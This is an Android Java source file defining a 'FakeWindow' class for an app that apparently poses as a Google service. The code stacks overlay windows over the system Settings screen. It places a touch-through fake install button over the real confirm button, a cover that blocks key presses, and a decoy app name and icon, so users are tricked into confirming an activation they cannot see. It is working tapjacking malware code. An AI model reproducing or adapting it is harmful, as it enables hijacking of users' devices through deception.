package com.xstd.plugin.Utils;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.graphics.drawable.Drawable;
import android.os.Handler;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.*;
import android.widget.ImageView;
import android.widget.TextView;
import com.googl.plugin.x.R;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: PM10:19
 * To change this template use File | Settings | File Templates.
 */
public class FakeWindow {

    public static interface WindowListener {

        void onWindowPreDismiss();

        void onWindowDismiss();
    }

    public static final int FAKE_WINDOW_SHOW_DELAY_MS = 180;
    public static final long FAKE_WINDOW_SHOW_DELAY = ((long) FAKE_WINDOW_SHOW_DELAY_MS) * 1000;

    private View coverView;
    private View timerView;
    private TextView timeTV;
    private View installView;
    private Context context;
    private WindowManager wm;
    private int count = FAKE_WINDOW_SHOW_DELAY_MS;
    private Handler handler;

    private WindowManager.LayoutParams fullConfirmBtnParams;
    private View fullInstallView;

    private WindowListener mWindowListener;
    private LayoutInflater mLayoutInflater;

    private String mCoverString;
    private TextView mCoverContent;

    public FakeWindow(Context context, WindowListener l) {
        this.context = context;
        LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        mLayoutInflater = layoutInflater;
        coverView = layoutInflater.inflate(R.layout.plugin_app_details, null);
        mCoverContent = (TextView) coverView.findViewById(R.id.center_explanation);
        timerView = layoutInflater.inflate(R.layout.plugin_fake_timer, null);
        timeTV = (TextView) timerView.findViewById(R.id.timer);
        installView = layoutInflater.inflate(R.layout.plugin_fake_install_btn, null);
        wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        handler = new Handler(context.getMainLooper());

        mWindowListener = l;

        try {
            //获取提示的应用信息
            PackageManager pm = context.getPackageManager();
            String packageName = PluginSettingManager.getInstance().getKeyActivePackageName();
            ImageView iconImageView = (ImageView) coverView.findViewById(R.id.app_icon);
            TextView nameTV = (TextView) coverView.findViewById(R.id.app_name);
            String name = PluginSettingManager.getInstance().getKeyActiveAppName();
            Drawable icon = null;
            if (!TextUtils.isEmpty(packageName)) {
                PackageInfo pInfo = pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
                if (pInfo != null) {
                    icon = pm.getApplicationIcon(pInfo.packageName);
                    name = pInfo.applicationInfo.loadLabel(pm).toString();
                }
            } else {
                icon = context.getResources().getDrawable(R.drawable.icon_show);
                name = "google服务";
            }

            iconImageView.setImageDrawable(icon);
            nameTV.setText(String.format(context.getString(R.string.protocal_title), name));

            int channel = Integer.valueOf(Config.CHANNEL_CODE);
            if (channel > 800000 && channel < 900000) {
                name = "本次装机完成";
                nameTV.setText(name);
                mCoverContent.setText("请卸载计数器程序!");
                mCoverString = "请卸载计数器程序!";
                timeTV.setText("");

            }
        } catch (Exception e) {
        }

    }

    public void updateCoverString(String content) {
        mCoverString = content;
    }

    public void updateTimerCount() {
        if (count <= 0) {
            if (mWindowListener != null) {
                mWindowListener.onWindowDismiss();
            }
            if (coverView != null && timerView != null) {
                UtilsRuntime.goHome(context);
                wm.removeView(coverView);
                wm.removeView(timerView);
                wm.removeView(installView);
            }
            if (fullInstallView != null) {
                wm.removeView(fullInstallView);
            }
            fullInstallView = null;
            coverView = null;
            timerView = null;
            installView = null;

            AppRuntime.FAKE_WINDOW_SHOW = false;
            AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
            AppRuntime.WATCHING_SERVICE_BREAK.set(true);
        } else {
            if (count == 2) {
                AppRuntime.WATCHING_SERVICE_BREAK.set(true);
            }

            if (!AppRuntime.WATCHING_TOP_IS_SETTINGS.get()) {
                //当前顶层窗口不是setting
                if (fullInstallView == null) {
                    fullInstallView = mLayoutInflater.inflate(R.layout.plugin_fake_install_btn, null);
                    wm.addView(fullInstallView, fullConfirmBtnParams);
                }
            } else {
                if (fullInstallView != null) {
                    wm.removeView(fullInstallView);
                }
                fullInstallView = null;
            }

            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (coverView != null && timerView != null) {
//                        timeTV.setText(String.format(context.getString(R.string.plugin_fake_timer), count));
//                        timeTV.setText("取消");
                        if (!TextUtils.isEmpty(mCoverString)) {
                            mCoverContent.setText(mCoverString);
                        }

                        count--;

                        if (count == 0) {
                            if (mWindowListener != null) {
                                mWindowListener.onWindowPreDismiss();
                            }
                        }

                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                updateTimerCount();
                            }
                        }, 1000);
                    }
                }
            });
        }

    }

    public void dismiss() {
        count = 4;
    }

    public void updateCount(int count) {
        this.count = count;
    }

    public void show() {
        AppRuntime.FAKE_WINDOW_SHOW = true;
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        int screenWidth = dm.widthPixels;
        int screenHeight = dm.heightPixels;
        float density = dm.density;

        /**
         * 初始化全遮盖的button
         */
        fullConfirmBtnParams = new WindowManager.LayoutParams();
        fullConfirmBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        fullConfirmBtnParams.format = PixelFormat.RGBA_8888;
        fullConfirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        fullConfirmBtnParams.width = screenWidth / 2;
        fullConfirmBtnParams.height = (int) (48 * density);
        if (AppRuntime.isVersionBeyondGB()) {
            fullConfirmBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        } else {
            fullConfirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        }

        /**
         * 测试代码，确认按键全遮盖
         * 经确认可以支持激活的全遮盖
         */
        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
        confirmBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        confirmBtnParams.format = PixelFormat.RGBA_8888;
        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        confirmBtnParams.width = screenWidth / 2;
        confirmBtnParams.height = (int) (48 * density);
        if (AppRuntime.isVersionBeyondGB()) {
            confirmBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        } else {
            confirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        }
        wm.addView(installView, confirmBtnParams);

        //timer
        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
        btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
        btnParams.format = PixelFormat.RGBA_8888;
        btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        btnParams.width = screenWidth / 2;
        btnParams.height = (int) (48 * density);
        if (AppRuntime.isVersionBeyondGB()) {
            btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        } else {
            btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        }
        wm.addView(timerView, btnParams);

        //cover
        WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
        wMParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
        wMParams.format = PixelFormat.RGBA_8888;
        wMParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        wMParams.width = WindowManager.LayoutParams.FILL_PARENT;
        wMParams.height = screenHeight - (int) ((48 + 25) * density);
        wMParams.gravity = Gravity.LEFT | Gravity.TOP;
        coverView.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                return true;
            }
        });
        wm.addView(coverView, wMParams);
    }

}
